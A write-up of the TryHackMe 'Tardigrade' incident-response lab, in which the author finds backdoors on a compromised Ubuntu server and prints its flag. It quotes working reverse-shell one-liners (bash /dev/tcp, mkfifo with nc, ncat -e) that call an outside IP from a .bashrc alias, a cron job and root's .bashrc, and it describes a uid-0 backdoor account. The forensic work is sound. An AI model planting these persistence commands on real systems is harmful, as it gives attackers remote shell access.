# [TryHackMe - Tardigrade](https://tryhackme.com/room/tardigrade)
![e3c209fe00d6503716cccae1db4969f3.png](/resources/e3c209fe00d6503716cccae1db4969f3.png)
***
[toc]
***
## Connect to the machine via SSH
**A server has been compromised, and the security team has decided to isolate the machine until it's been thoroughly cleaned up. Initial checks by the Incident Response team revealed that there are five different backdoors. It's your job to find and remediate them before giving the signal to bring the server back to production.**

>What is the server's OS version?

![dcf367d3e49a53520655ef25b7a86d2a.png](/resources/dcf367d3e49a53520655ef25b7a86d2a.png)

After connected to the compromised machine via SSH, we can use either of these command to get the OS version of this machine 
- `cat /etc/issues`
- `cat /etc/os-release`
- `hostnamectl`
- `lsb_release -a`
- `uname -a`

```
Ubuntu 20.04.4 LTS
```

* * *
## Investigating the giorgio account
**Since we're in the giorgio account already, we might as well have a look around.**

>What's the most interesting file you found in giorgio's home directory?

![1848406cbece65641b1b4f6613987956.png](/resources/1848406cbece65641b1b4f6613987956.png)

First thing we could do when investigate malware residing on the home directory is to run `ls -lha` which will display all files including hidden files of the current directory then we can see that `.bad_bash` appears to be very suspicious one since the rest are common files/folders that could be found on other Linux systems as well plus the file owns by root on other user directory is always picking an interested.  

![9e9e5c3644691f81a9bb8e978a81b306.png](/resources/9e9e5c3644691f81a9bb8e978a81b306.png)

By using `file` utility, we can see that this file is ELF file so its a standard binary to be executed on Linux and this file appears to be the answer of this question as well.

```
.bad_bash
```

>In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later. <br>
Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?

![b724eda620d469b6114bff2a5a98fd04.png](/resources/b724eda620d469b6114bff2a5a98fd04.png)

`.bashrc` file is a script file that executed when respective user login which contains a lot of configuration, alias and can be abused to add persistence shell command within it and seem like we have one in this case as well, the attacker set alias for `ls` command to execute reverse shell command to 172.10.6.9 on port 6969.

```
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
```

>It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.<br>
Did you find anything interesting about scheduled tasks?

![2dba2c78f82ea98eb93732b6631ea844.png](/resources/2dba2c78f82ea98eb93732b6631ea844.png)

Another popular persistence mechanism on Linux is cronjob which we can use `crontab -l` to list cronjob own by respective user who executed the command and in this case, we can see that there is an another reverse shell script being executed every minute to the same IP address and port from previous question.

```
/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
```

* * *
## Investigating the root account
**Normal user accounts aren't the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account.**

>A few moments after logging on to the root account, you find an error message in your terminal. <br>
What does it say?

![035f02b78c7ccfbca0c437be759eab22.png](/resources/035f02b78c7ccfbca0c437be759eab22.png)

By running `sudo -l`, we can see that current user is capable to execute any command as root so we can switch to root user with `sudo su` and then as soon as we entered root shell, and error message displayed as seen in the image above. and this error exclusively has something to do with `ncat` so its likely to be another persistence mechanism to execute reverse shell as root.

```
Ncat: TIMEOUT.
```

>After moving forward with the error message, a suspicious command appears in the terminal as part of the error message. <br>
What command was displayed?

![59020ce51dc3aff17abc6384b201b07b.png](/resources/59020ce51dc3aff17abc6384b201b07b.png)

After typing "Enter", we can see the command that triggered the error and we confirmed that this is the reverse shell command that will connect to the same IP address we found earlier. 

```
ncat -e /bin/bash 172.10.6.9 6969
```

>You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened." <br>
Can you find out how the suspicious command has been implemented?

![02c3aa79d818ffdd1a444be3906353dc.png](/resources/02c3aa79d818ffdd1a444be3906353dc.png)

When switch user to root, the behavior is likely to be the same as login and the persistence mechanism that can be triggered via login on each user is `.bashrc` which we can see that there is the same command we found from the previous question reside on the `.bashrc` of root user. 

```
.bashrc
```

* * *
## Investigating the system
**After checking the giorgio and the root accounts, it's essentially a free-for-all from here on, as finding more suspicious items depends on how well you know what's "normal" in the system.**

>There's one more persistence mechanism in the system.<br>
A good way to systematically dissect the system is to look for "usuals" and "unusuals". For example, you can check for commonly abused or unusual files and directories.<br>
This specific persistence mechanism is directly tied to something (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. What's its name?<br>
What is the last persistence mechanism?

![af3fde8558c47fce831f1ec1ff05935d.png](/resources/af3fde8558c47fce831f1ec1ff05935d.png)

Since there is no SSH public key backdoor and cronjob as root found, I checked all users from `/etc/passwd` which I found that there is another user with has the same uid as root which mean this user is another root user on this machine and it just happened to be the backdoor user and the last persistence mechanism we are looking for.

```
nobody
```

* * *
## Final Thoughts
**Now that you've found the final persistence mechanism, it's time to clean up. The persistence mechanisms tackled in this room are common and straightforward; as such, the process of eradicating them is simple.**

**The first four persistence mechanisms can be remediated by simply removing the mechanism (e.g. delete the file, remove the commands). The last one, however, involves bringing back the "unusuals" to their "usual" state, which is a bit more complex as you intend for that particular user, file or process to function as before.**

>Finally, as you've already found the final persistence mechanism, there's value in going all the way through to the end. <br>
The adversary left a golden nugget of "advise" somewhere. <br>
What is the nugget?

![9c0db4a5c4137ec5ffc97bb2aeb9a9ff.png](/resources/9c0db4a5c4137ec5ffc97bb2aeb9a9ff.png)

From the previous result (`/etc/passwd`), we found that the home directory of nobody user is `/nonexistence` so I went to this directory and list all the files which there is 1 hidden file that really stand out here that contains a flag so we can display the content of this file with `cat` directly.

```
THM{Nob0dy_1s_s@f3}
```

![f6fac30d86db78725cde01455aaae920.png](/resources/f6fac30d86db78725cde01455aaae920.png)

And we are done!
***